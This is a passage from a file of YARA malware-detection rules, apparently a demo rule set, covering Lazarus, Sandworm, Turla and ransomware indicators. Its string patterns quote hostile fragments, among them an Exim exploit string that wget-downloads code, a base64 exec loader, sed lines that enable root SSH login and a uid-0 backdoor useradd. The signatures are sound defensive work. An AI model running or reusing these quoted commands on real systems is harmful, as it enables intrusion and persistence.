APT CRIME DEMO EXE FILE G0032 MAL NK RANSOM {\n   meta:\n      description = \"Detects Lazarus VHD Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/\"\n      date = \"2020-10-05 16:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"097ca829e051a4877bca093cee340180ff5f13a9c266ad4141b0be82aae1a39b\"\n      hash2 = \"73a10be31832c9f1cbbd798590411009da0881592a90feb472e80025dfb0ea79\"\n      tags = \"APT, CRIME, DEMO, EXE, FILE, G0032, MAL, NK, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { f9 36 88 08 8d ad fc ff ff ff 66 ff c1 e9 72 86 } \n      $op2 = { c6 c4 58 0f a4 c8 12 8d ad ff ff ff ff 0f b6 44 } \n      $op3 = { 88 02 66 c1 f0 54 8d bf fc ff ff ff 0f ba e0 19 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule APT_MAL_SLOTHFULMEDIA_Oct20_1_RID2FD6 : APT DEMO EXE MAL {\n   meta:\n      description = \"Detects SLOTHFULMEDIA malware\"\n      author = \"Florian Roth\"\n      reference = \"https://us-cert.cisa.gov/ncas/analysis-reports/ar20-275a\"\n      date = \"2020-10-01 12:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"64d78eec46c9ddd4b9a366de62ba0f2813267dc4393bc79e4c9a51a9bb7e6273\"\n      hash2 = \"927d945476191a3523884f4c0784fb71c16b7738bd7f2abd1e3a198af403f0ae\"\n      hash3 = \"f0503f0131040b805e106eafe64a65d9404a0e279f052237b868e456c34d36e6\"\n      tags = \"APT, DEMO, EXE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 25 73 26 69 3D 25 64 00 48 54 54 50 2F 31 2E 31\n               00 00 00 00 50 4F 53 54 00 00 00 00 43 6F 6E 74\n               65 6E 74 2D 4C 65 6E 67 74 68 3A 20 25 64 00 00\n               5C 00 53 00 65 00 74 00 75 00 70 00 55 00 69 00\n               00 00 00 00 25 00 73 00 25 00 73 00 5F 00 25 00\n               64 00 2E 00 64 00 61 00 74 } \n      $xc2 = { 2F 76 3F 6D 3D 00 00 00 35 30 31 00 32 30 30 00\n               2A 00 2E 00 2A 00 00 00 25 00 73 00 00 00 00 00\n               53 00 65 00 44 00 65 00 62 00 75 00 67 00 50 00\n               72 00 69 00 76 00 69 00 6C 00 65 00 67 00 65 } \n      $xc3 = { 00 25 00 73 00 7C 00 25 00 73 00 7C 00 25 00 73\n               00 7C 00 25 00 73 00 00 00 5C 00 46 00 69 00 6C\n               00 74 00 65 00 72 00 33 00 2E 00 6A 00 70 00 67 } \n      $sc1 = { 25 74 65 6D 70 25 00 00 25 73 5C 25 73 2E 65 78\n               65 00 00 00 25 74 65 6D 70 25 00 00 25 73 5C 25\n               73 2E 65 78 65 } \n      $sc2 = { 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6F 63 74 65\n               74 2D 73 74 72 65 61 6D 2C 61 70 70 6C 69 63 61\n               74 69 6F 6E 2F 78 68 74 6D 6C 00 00 25 73 26 69\n               3D 25 64 00 48 54 54 50 2F 31 2E 31 00 00 00 00\n               50 4F 53 54 } \n      $s1 = \"%s%s_%d.dat\" wide fullword\n      $s2 = \"Local Security Process\" wide fullword\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75\" ascii fullword\n      $s4 = \"Global%s%d\" wide fullword\n      $s5 = \"ExtKeyloggerStart\" ascii fullword\n      $s6 = \"GetExtendedTcpTable\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them\n}\n\nrule SUSP_ZIP_NtdsDIT_RID2C87 : DEMO FILE SUSP T1003_003 T1020 {\n   meta:\n      description = \"Detects ntds.dit files in ZIP archives that could be a left over of administrative activity or traces of data exfiltration\"\n      author = \"Florian Roth\"\n      reference = \"https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\"\n      date = \"2020-08-10 09:53:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP, T1003_003, T1020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ntds.dit\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and $s1 in ( 0 .. 256 )\n}\n\nrule HKTL_Mimikatz_SkeletonKey_in_memory_Aug20_1_RID3752 : DEMO HKTL S0002 T1003 T1098_004 T1134_005 T1547_008 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects Mimikatz SkeletonKey in Memory\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/sbousseaden/status/1292143504131600384?s=12\"\n      date = \"2020-08-09 17:33:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, S0002, T1003, T1098_004, T1134_005, T1547_008, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38\n              03 3c 17 81 c7 44 24 3c 94 c0 3d f6 } \n   condition: \n      1 of them\n}\n\nrule SUSP_LNX_Linux_Malware_Indicators_Aug20_1_RID3621 : DEMO LINUX SUSP T1033 {\n   meta:\n      description = \"Detects indicators often found in linux malware samples. Note: This detection is based on common characteristics typically associated with the mentioned threats, must be considered a clue and does not conclusively prove maliciousness.\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-08-03 16:42:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, LINUX, SUSP, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&& chmod +x\" ascii\n      $s2 = \"|base64 -\" ascii\n      $s3 = \" /tmp\" ascii\n      $s4 = \"|curl \" ascii\n      $s5 = \"whoami\" ascii fullword\n      $fp1 = \"WITHOUT ANY WARRANTY\" ascii\n      $fp2 = \"postinst\" ascii fullword\n      $fp3 = \"THIS SOFTWARE IS PROVIDED\" ascii fullword\n      $fp4 = \"Free Software Foundation\" ascii fullword\n   condition: \n      filesize < 400KB and 3 of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule SUSP_RANSOMWARE_Indicator_Jul20_RID31A2 : CRIME DEMO EXE FILE RANSOM SUSP {\n   meta:\n      description = \"Detects ransomware indicator\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/\"\n      date = \"2020-07-28 13:30:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"52888b5f881f4941ae7a8f4d84de27fc502413861f96ee58ee560c09c11880d6\"\n      hash2 = \"5e78475d10418c6938723f6cfefb89d5e9de61e45ecf374bb435c1c99dd4a473\"\n      hash3 = \"6cb9afff8166976bd62bb29b12ed617784d6e74b110afcf8955477573594f306\"\n      tags = \"CRIME, DEMO, EXE, FILE, RANSOM, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Decrypt.txt\" ascii wide\n      $ = \"DecryptFiles.txt\" ascii wide\n      $ = \"Decrypt-Files.txt\" ascii wide\n      $ = \"DecryptFilesHere.txt\" ascii wide\n      $ = \"DECRYPT.txt\" ascii wide\n      $ = \"DecryptFiles.txt\" ascii wide\n      $ = \"DECRYPT-FILES.txt\" ascii wide\n      $ = \"DecryptFilesHere.txt\" ascii wide\n      $ = \"DECRYPT_INSTRUCTION.TXT\" ascii wide\n      $ = \"FILES ENCRYPTED.txt\" ascii wide\n      $ = \"DECRYPT MY FILES\" ascii wide\n      $ = \"DECRYPT-MY-FILES\" ascii wide\n      $ = \"DECRYPT_MY_FILES\" ascii wide\n      $ = \"DECRYPT YOUR FILES\" ascii wide\n      $ = \"DECRYPT-YOUR-FILES\" ascii wide\n      $ = \"DECRYPT_YOUR_FILES\" ascii wide\n      $ = \"DECRYPT FILES.txt\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1400KB and 1 of them\n}\n\nrule SUSP_RAR_Single_Doc_File_RID2FB5 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects suspicious RAR files that contain nothing but a single .doc file\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-07-11 12:08:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"51a568ac3ceb6bc4a4a123af9ca383a32bac0f630b17a1cc99e45ff8002727b1\"\n      hash2 = \"f9eddbebf9c41089d7507291adbaac8a4bcebffcd960f838d8a9648194d38a4a\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".doc\" \n   condition: \n      uint16 ( 0 ) == 0x6152 and filesize < 4000KB and $s1 at ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + uint16 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 5 ) - 9 ) and ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + uint16 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 5 ) + uint32 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 7 ) > filesize - 8 )\n}\n\nrule SUSP_GIF_Anomalies_RID2D89 : DEMO FILE OBFUS SUSP {\n   meta:\n      description = \"Detects files with GIF headers and format anomalies - which means that this image could be an obfuscated file of a different type\"\n      author = \"Florian Roth\"\n      reference = \"https://en.wikipedia.org/wiki/GIF\"\n      date = \"2020-07-02 10:36:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, OBFUS, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x4947 and uint8 ( 2 ) == 0x46 and uint8 ( 11 ) != 0x00 and uint8 ( 12 ) != 0x00 and uint8 ( filesize - 1 ) != 0x3b\n}\n\nrule APT_MAL_Ke3chang_Ketrican_Jun20_1_RID3280 : APT DEMO EXE G0004 MAL {\n   meta:\n      description = \"Detects Ketrican malware\"\n      author = \"Florian Roth\"\n      reference = \"BfV Cyber-Brief Nr. 01/2020\"\n      date = \"2020-06-18 14:07:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"02ea0bc17875ab403c05b50205389065283c59e01de55e68cee4cf340ecea046\"\n      hash2 = \"f3efa600b2fa1c3c85f904a300fec56104d2caaabbb39a50a28f60e0fdb1df39\"\n      tags = \"APT, DEMO, EXE, G0004, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 00 59 89 85 D4 FB FF FF 8B 85 D4 FB FF FF 89 45\n               FC 68 E0 58 40 00 8F 45 FC E9 } \n      $op1 = { 6a 53 58 66 89 85 24 ff ff ff 6a 79 58 66 89 85 } \n      $op2 = { 8d 45 bc 50 53 53 6a 1c 8d 85 10 ff ff ff 50 ff } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 2 of them\n}\n\nrule SUSP_Reversed_Hacktool_Author_RID3261 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects a suspicious path traversal into a Windows folder\"\n      author = \"Florian Roth\"\n      reference = \"https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/\"\n      date = \"2020-06-10 14:02:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"iwiklitneg\" fullword ascii wide\n      $x2 = \" eetbus@ \" ascii wide\n   condition: \n      filesize < 4000KB and 1 of them\n}\n\nrule SUSP_Base64_Encoded_Hacktool_Dev_RID32C3 : DEMO SUSP T1132_001 {\n   meta:\n      description = \"Detects a suspicious base64 encoded keyword\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1270626274826911744\"\n      date = \"2020-06-10 14:19:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"QGdlbnRpbGtpd2\" ascii wide\n      $ = \"BnZW50aWxraXdp\" ascii wide\n      $ = \"AZ2VudGlsa2l3a\" ascii wide\n      $ = \"QGhhcm1qMH\" ascii wide\n      $ = \"BoYXJtajB5\" ascii wide\n      $ = \"AaGFybWowe\" ascii wide\n      $ = \"IEBzdWJ0ZW\" ascii wide\n      $ = \"BAc3VidGVl\" ascii wide\n      $ = \"gQHN1YnRlZ\" ascii wide\n   condition: \n      filesize < 6000KB and 1 of them\n}\n\nrule SUSP_Script_Base64_Blocks_Jun20_1_RID32AF : DEMO SCRIPT SUSP T1132_001 {\n   meta:\n      description = \"Detects suspicious file with base64 encoded payload in blocks\"\n      author = \"Florian Roth\"\n      reference = \"https://posts.specterops.io/covenant-v0-5-eee0507b85ba\"\n      date = \"2020-06-05 14:15:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"<script language=\" ascii\n      $sb2 = { 41 41 41 22 2B 0D 0A 22 41 41 41 } \n   condition: \n      all of them\n}\n\nrule SUSP_Recon_Outputs_Jun20_1_RID3093 : DEMO SUSP {\n   meta:\n      description = \"Detects outputs of many different commands often used for reconnaissance purposes\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/cycldek-bridging-the-air-gap/97157/\"\n      date = \"2020-06-04 12:45:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \". . . . : Yes\" ascii\n      $s2 = \"with 32 bytes of data:\" ascii\n      $s3 = \"ff-ff-ff-ff-ff-ff     static\" ascii\n      $s4 = \"  TCP    0.0.0.0:445\" ascii\n      $s5 = \"System Idle Process\" ascii\n   condition: \n      filesize < 150KB and 4 of them\n}\n\nrule APT_MAL_RU_Turla_Kazuar_May20_1_RID31E1 : APT DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Turla Kazuar malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.epicturla.com/blog/sysinturla\"\n      date = \"2020-05-28 13:41:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1749c96cc1a4beb9ad4d6e037e40902fac31042fa40152f1d3794f49ed1a2b5c\"\n      hash2 = \"1fca5f41211c800830c5f5c3e355d31a05e4c702401a61f11e25387e25eeb7fa\"\n      hash3 = \"2d8151dabf891cf743e67c6f9765ee79884d024b10d265119873b0967a09b20f\"\n      tags = \"APT, DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Sysinternals\" ascii fullword\n      $s2 = \"Test Copyright\" wide fullword\n      $op1 = { 0d 01 00 08 34 2e 38 30 2e 30 2e 30 00 00 13 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule APT_Sandworm_Keywords_May20_1_RID31CF : APT CVE_2019_10149 DEMO {\n   meta:\n      description = \"Detects commands used by Sandworm group to exploit critical vulernability CVE-2019-10149 in Exim\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 13:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CVE_2019_10149, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"MAIL FROM:<$(run(\" \n      $x2 = \"exec\\\\x20\\\\x2Fusr\\\\x2Fbin\\\\x2Fwget\\\\x20\\\\x2DO\\\\x20\\\\x2D\\\\x20http\" \n   condition: \n      filesize < 8000KB and 1 of them\n}\n\nrule APT_Sandworm_SSH_Key_May20_1_RID30ED : APT DEMO T1021_004 {\n   meta:\n      description = \"Detects SSH key used by Sandworm on exploited machines\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 13:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO, T1021_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2q/NGN/brzNfJiIp2zswtL33tr74pIAjMeWtXN1p5Hqp5fTp058U1EN4NmgmjX0KzNjjV\" \n   condition: \n      filesize < 1000KB and 1 of them\n}\n\nrule APT_Sandworm_SSHD_Config_Modification_May20_1_RID3793 : APT DEMO T1021_004 {\n   meta:\n      description = \"Detects ssh config entry inserted by Sandworm on compromised machines\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 17:44:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO, T1021_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AllowUsers mysql_db\" ascii\n      $a1 = \"ListenAddress\" ascii fullword\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule APT_Sandworm_InitFile_May20_1_RID318B : APT DEMO SCRIPT {\n   meta:\n      description = \"Detects mysql init script used by Sandworm on compromised machines\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 13:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GRANT ALL PRIVILEGES ON * . * TO 'mysqldb'@'localhost';\" ascii\n      $s2 = \"CREATE USER 'mysqldb'@'localhost' IDENTIFIED BY '\" ascii fullword\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule APT_Sandworm_User_May20_1_RID3016 : APT DEMO {\n   meta:\n      description = \"Detects user added by Sandworm on compromised machines\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 12:24:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mysql_db:x:\" ascii\n      $a1 = \"root:x:\" \n      $a2 = \"daemon:x:\" \n   condition: \n      filesize < 4KB and all of them\n}\n\nrule APT_WEBSHELL_PHP_Sandworm_May20_1_RID3214 : APT DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects GIF header PHP webshell used by Sandworm on compromised machines\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 13:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"GIF89a <?php $\" ascii\n      $s1 = \"str_replace(\" ascii\n   condition: \n      filesize < 10KB and $h1 at 0 and $s1\n}\n\nrule APT_SH_Sandworm_Shell_Script_May20_1_RID343D : APT DEMO SCRIPT T1136 T1543_004 {\n   meta:\n      description = \"Detects shell script used by Sandworm in attack against Exim mail server\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf\"\n      date = \"2020-05-28 15:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730\"\n      hash2 = \"538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e\"\n      tags = \"APT, DEMO, SCRIPT, T1136, T1543_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"echo \\\"GRANT ALL PRIVILEGES ON * . * TO 'mysqldb'@'localhost';\\\" >> init-file.txt\" ascii fullword\n      $x2 = \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version\" ascii fullword\n      $x3 = \"sed -i -e '/PasswordAuthentication/s/no/yes/g; /PermitRootLogin/s/no/yes/g;\" ascii fullword\n      $x4 = \"useradd -M -l -g root -G root -b /root -u 0 -o mysql_db\" ascii fullword\n      $s1 = \"/ip.php?port=${PORT}\\\"\" ascii fullword\n      $s2 = \"sed -i -e '/PasswordAuthentication\" ascii fullword\n      $s3 = \"PATH_KEY=/root/.ssh/authorized_keys\" ascii fullword\n      $s4 = \"CREATE USER\" ascii fullword\n      $s5 = \"crontab -l | { cat; echo\" ascii fullword\n      $s6 = \"mysqld --user=mysql --init-file=/etc/opt/init-file.txt --console\" ascii fullword\n      $s7 = \"sshkey.php\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of ( $x* ) or 4 of them\n}\n\nrule APT_RU_Sandworm_PY_May20_1_RID3026 : APT DEMO RUSSIA SCRIPT T1059_006 {\n   meta:\n      description = \"Detects Sandworm Python loader\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/billyleonard/status/1266054881225236482\"\n      date = \"2020-05-28 12:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c025008463fdbf44b2f845f2d82702805d931771aea4b506573b83c8f58bccca\"\n      tags = \"APT, DEMO, RUSSIA, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]\" ascii fullword\n      $s1 = \"exec(o.open('http://\" ascii\n      $s2 = \"__import__({2:'urllib2',3:'urllib.request'}\" \n   condition: \n      uint16 ( 0 ) == 0x6d69 and filesize < 1KB and 1 of ( $x* ) or 2 of them\n}\n\nrule APT_RU_Sandworm_PY_May20_2_RID3027 : APT DEMO FILE RUSSIA SCRIPT T1059_006 {\n   meta:\n      description = \"Detects Sandworm Python loader\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/billyleonard/status/1266054881225236482\"\n      date = \"2020-05-28 12:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"abfa83cf54db8fa548942acd845b4f34acc94c46d4e1fb5ce7e97cc0c6596676\"\n      tags = \"APT, DEMO, FILE, RUSSIA, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"import sys;import re, subprocess;cmd\" ascii fullword\n      $x2 = \"UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http\" \n      $x3 = \"';t='/admin/get.php';req\" ascii\n      $x4 = \"ps -ef | grep Little\\\\ Snitch | grep \" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x6d69 and filesize < 2KB and 1 of them\n}\n\nrule APT_LNX_Academic_Camp_May20_Eraser_1_RID33C6 : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects malware used in attack on academic data centers\"\n      author = \"Florian Roth\"\n      reference = \"https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/\"\n      date = \"2020-05-16 15:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"552245645cc49087dfbc827d069fa678626b946f4b71cb35fa4a49becd971363\"\n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc2 = { E6 FF FF 48 89 45 D0 8B 45 E0 BA 00 00 00 00 BE\n               00 00 00 00 89 C7 E8 } \n      $sc3 = { E6 FF FF 89 45 DC 8B 45 DC 83 C0 01 48 98 BE 01\n               00 00 00 48 89 C7 E8 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them\n}\n\nrule APT_LNX_Academic_Camp_May20_Loader_1_RID33BB : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects malware used in attack on academic data centers\"\n      author = \"Florian Roth\"\n      reference = \"https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/\"\n      date = \"2020-05-16 15:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0efdd382872f0ff0866e5f68f0c66c01fcf4f9836a78ddaa5bbb349f20353897\"\n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc1 = { C6 45 F1 00 C6 45 F2 0A C6 45 F3 0A C6 45 F4 4A\n               C6 45 F5 04 C6 45 F6 06 C6 45 F7 1B C6 45 F8 01 } \n      $sc2 = { 01 48 39 EB 75 EA 48 83 C4 08 5B 5D 41 5C 41 5D } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 10KB and all of them\n}\n\nrule MAL_RANSOM_Ragna_Locker_Apr20_1_RID3195 : CRIME DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects Ragna Locker Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://otx.alienvault.com/indicator/file/c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6\"\n      date = \"2020-04-27 13:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6\"\n      tags = \"CRIME, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"---RAGNAR SECRET---\" ascii\n      $xc1 = { 0D 0A 25 73 0D 0A 0D 0A 25 73 0D 0A 25 73 0D 0A\n               25 73 0D 0A 0D 0A 25 73 0D 0A 00 00 2E 00 72 00\n               61 00 67 00 6E 00 61 00 72 00 5F } \n      $xc2 = { 00 2D 00 66 00 6F 00 72 00 63 00 65 00 00 00 00\n               00 57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C\n               00 44 00 65 